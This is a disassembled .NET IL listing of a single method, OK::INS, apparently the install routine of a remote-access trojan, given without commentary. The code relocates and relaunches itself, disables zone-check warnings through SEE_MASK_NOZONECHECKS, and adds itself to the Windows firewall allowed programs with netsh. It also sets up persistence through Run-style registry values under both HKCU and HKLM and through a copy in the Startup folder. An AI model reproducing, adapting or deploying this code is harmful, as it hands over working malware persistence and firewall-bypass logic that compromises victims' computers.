  .method public static void  INS() cil managed
  {
    // Code size       689 (0x2b1)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string[] V_8)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_011f

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                                        class [mscorlib]System.IO.FileInfo)
    IL_0046:  brfalse.s  IL_004d

    IL_0048:  br         IL_011f

    .try
    {
      IL_004d:  ldsfld     string j.OK::DR
      IL_0052:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0057:  ldstr      "\\"
      IL_005c:  ldsfld     string j.OK::EXE
      IL_0061:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0066:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_006b:  brfalse.s  IL_008b

      IL_006d:  ldsfld     string j.OK::DR
      IL_0072:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0077:  ldstr      "\\"
      IL_007c:  ldsfld     string j.OK::EXE
      IL_0081:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0086:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_008b:  ldsfld     string j.OK::DR
      IL_0090:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0095:  ldstr      "\\"
      IL_009a:  ldsfld     string j.OK::EXE
      IL_009f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a4:  ldc.i4.1
      IL_00a5:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00aa:  stloc.1
      IL_00ab:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00b0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b5:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00ba:  stloc.0
      IL_00bb:  ldloc.1
      IL_00bc:  ldloc.0
      IL_00bd:  ldc.i4.0
      IL_00be:  ldloc.0
      IL_00bf:  ldlen
      IL_00c0:  conv.ovf.i4
      IL_00c1:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c6:  ldloc.1
      IL_00c7:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00cc:  ldloc.1
      IL_00cd:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00d2:  ldsfld     string j.OK::DR
      IL_00d7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00dc:  ldstr      "\\"
      IL_00e1:  ldsfld     string j.OK::EXE
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00f0:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00fa:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00ff:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0104:  pop
      IL_0105:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_010a:  leave.s    IL_011f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_010c:  dup
      IL_010d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0112:  stloc.2
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0118:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011d:  leave.s    IL_011f

    }  // end handler
    .try
    {
      IL_011f:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0124:  ldstr      "1"
      IL_0129:  ldc.i4.1
      IL_012a:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_012f:  leave.s    IL_013f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0131:  dup
      IL_0132:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0137:  stloc.3
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013d:  leave.s    IL_013f

    }  // end handler
    .try
    {
      IL_013f:  ldc.i4.5
      IL_0140:  newarr     [mscorlib]System.String
      IL_0145:  stloc.s    V_8
      IL_0147:  ldloc.s    V_8
      IL_0149:  ldc.i4.0
      IL_014a:  ldstr      "netsh firewall add allowedprogram \""
      IL_014f:  stelem.ref
      IL_0150:  ldloc.s    V_8
      IL_0152:  ldc.i4.1
      IL_0153:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0158:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_015d:  stelem.ref
      IL_015e:  ldloc.s    V_8
      IL_0160:  ldc.i4.2
      IL_0161:  ldstr      "\" \""
      IL_0166:  stelem.ref
      IL_0167:  ldloc.s    V_8
      IL_0169:  ldc.i4.3
      IL_016a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_016f:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0174:  stelem.ref
      IL_0175:  ldloc.s    V_8
      IL_0177:  ldc.i4.4
      IL_0178:  ldstr      "\" ENABLE"
      IL_017d:  stelem.ref
      IL_017e:  ldloc.s    V_8
      IL_0180:  call       string [mscorlib]System.String::Concat(string[])
      IL_0185:  ldc.i4.0
      IL_0186:  ldc.i4.1
      IL_0187:  ldc.i4     0x1388
      IL_018c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0191:  pop
      IL_0192:  leave.s    IL_01a3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0194:  dup
      IL_0195:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019a:  stloc.s    V_4
      IL_019c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a1:  leave.s    IL_01a3

    }  // end handler
    IL_01a3:  ldsfld     bool j.OK::Isu
    IL_01a8:  brfalse    IL_0249

    .try
    {
      IL_01ad:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01b2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01b7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01bc:  ldsfld     string j.OK::sf
      IL_01c1:  ldc.i4.1
      IL_01c2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01c7:  ldsfld     string j.OK::RG
      IL_01cc:  ldstr      "\""
      IL_01d1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01d6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01db:  ldstr      "\" .."
      IL_01e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01e5:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01ea:  leave.s    IL_01fb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ec:  dup
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f2:  stloc.s    V_5
      IL_01f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f9:  leave.s    IL_01fb

    }  // end handler
    .try
    {
      IL_01fb:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0200:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0205:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_020a:  ldsfld     string j.OK::sf
      IL_020f:  ldc.i4.1
      IL_0210:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0215:  ldsfld     string j.OK::RG
      IL_021a:  ldstr      "\""
      IL_021f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0224:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0229:  ldstr      "\" .."
      IL_022e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0233:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0238:  leave.s    IL_0249

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023a:  dup
      IL_023b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0240:  stloc.s    V_6
      IL_0242:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0247:  leave.s    IL_0249

    }  // end handler
    IL_0249:  ldsfld     bool j.OK::IsF
    IL_024e:  brfalse.s  IL_02b0

    .try
    {
      IL_0250:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0255:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_025a:  ldc.i4.7
      IL_025b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0260:  ldstr      "\\"
      IL_0265:  ldsfld     string j.OK::RG
      IL_026a:  ldstr      ".exe"
      IL_026f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0274:  ldc.i4.1
      IL_0275:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_027a:  ldc.i4.7
      IL_027b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0280:  ldstr      "\\"
      IL_0285:  ldsfld     string j.OK::RG
      IL_028a:  ldstr      ".exe"
      IL_028f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0294:  ldc.i4.3
      IL_0295:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_029a:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_029f:  leave.s    IL_02b0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a1:  dup
      IL_02a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a7:  stloc.s    V_7
      IL_02a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02ae:  leave.s    IL_02b0

    }  // end handler
    IL_02b0:  ret
  } // end of method OK::INS
